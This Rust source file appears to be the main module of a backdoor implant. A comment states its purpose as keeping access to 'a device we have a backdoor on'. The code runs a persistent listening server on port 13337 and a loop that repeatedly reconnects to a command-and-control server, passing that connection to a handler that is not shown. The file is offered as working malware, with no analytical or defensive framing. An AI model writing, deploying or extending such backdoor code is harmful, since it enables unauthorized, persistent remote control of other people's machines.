use std::alloc::System;

// Use system allocator as global allocator
// This is done in order to not use JEMALLOC which takes up a lot of space in the binary
#[global_allocator]
static GLOBAL_ALLOCATOR: System = System;

use std::{thread, time};
use std::net::TcpStream;
use crate::communication::server::handle_client;

pub mod communication;
pub mod os;

const RETRY_INTERVAL_SECONDS: u64 = 5;
const SERVER_LISTENING_PORT: u16 = 13337;

const CNC_SERVER_IP: &str = "127.0.0.1";
const CNC_SERVER_PORT: u16 = 9393;

fn run_server_loop() {
    // Using loop here because in case we fail to create the server, we should try again.
    // This is because we don't want to lose access to a device we have a backdoor on.
    loop {
        // Blocking until server will die.
        match communication::server::run_server(SERVER_LISTENING_PORT) {
            Ok(_) => (),
            Err(e) => {
                println!(
                    "Error {} when running server. Trying again in {} seconds.",
                    e, RETRY_INTERVAL_SECONDS
                );
            }
        }
        thread::sleep(time::Duration::from_secs(RETRY_INTERVAL_SECONDS));
    }
}

fn run_cnc_connection_loop() {
    loop {
        let server_address = format!("{}:{}", CNC_SERVER_IP, CNC_SERVER_PORT);
        match TcpStream::connect(server_address) {
            Ok(stream) => {
                println!("Successfully connected to cnc server!");
                thread::spawn(move || {
                    // connection succeeded
                    handle_client(stream)
                });
            }
            Err(e) => {
                println!("Failed to connect to cnc server, error: {}", e);
            }
        }
        std::thread::sleep(time::Duration::from_secs(RETRY_INTERVAL_SECONDS))
    }
}

fn main() {
    // Support several ways of communication - cnc remote server + local server listening on port.
    let server_handler = thread::spawn(|| run_server_loop());
    let cnc_connect = thread::spawn(|| run_cnc_connection_loop());

    cnc_connect
        .join()
        .expect("The cnc connection has panicked.");
    server_handler
        .join()
        .expect("The server connection has panicked.")
}
